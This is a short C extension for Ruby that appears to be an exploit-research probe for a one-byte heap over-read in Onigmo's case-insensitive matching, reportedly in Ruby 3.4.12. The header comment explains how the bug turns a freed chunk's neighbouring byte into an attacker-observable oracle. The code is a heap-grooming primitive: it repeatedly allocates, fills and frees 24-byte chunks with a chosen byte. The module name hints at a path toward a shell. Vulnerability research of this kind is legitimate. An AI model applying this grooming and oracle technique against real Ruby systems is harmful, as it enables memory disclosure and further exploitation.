/* Analysis-only probe: prime the small glibc free-chunk that Onigmo's
 * set_optimize_exact_info() reuses for reg->exact, then let Ruby compile
 * /s/i and match a subject whose case fold is longer than that one byte.
 *
 * In the vulnerable 3.4.12 str_lower_case_match() (regexec.c:4278) the loop
 * compares lowlen folded bytes against t[] while tend-t is only 1, so the
 * second comparison reads the byte immediately after reg->exact.  If a
 * stable true/false differential can be primed, that byte is an
 * attacker-observable one-byte heap read.  No wire path, no marker, no app.
 */
#include "ruby.h"
#include <stdlib.h>
#include <string.h>

static VALUE
casefold_oracle_prime(VALUE self, VALUE byte_value, VALUE count_value)
{
    unsigned int byte = NUM2UINT(byte_value);
    unsigned int count = NUM2UINT(count_value);
    unsigned int i;

    for (i = 0; i < count; i++) {
        char *p = (char *)malloc(24); /* same 0x20 chunk as xmalloc(1) */
        if (p == NULL) rb_raise(rb_eNoMemError, "malloc(24)");
        memset(p, (int)byte, 24);
        free(p);
    }
    return Qnil;
}

void
Init_ruby2shell_casefold_oracle(void)
{
    VALUE mod = rb_define_module("Ruby2ShellCasefoldOracle");
    rb_define_singleton_method(mod, "prime", casefold_oracle_prime, 2);
}
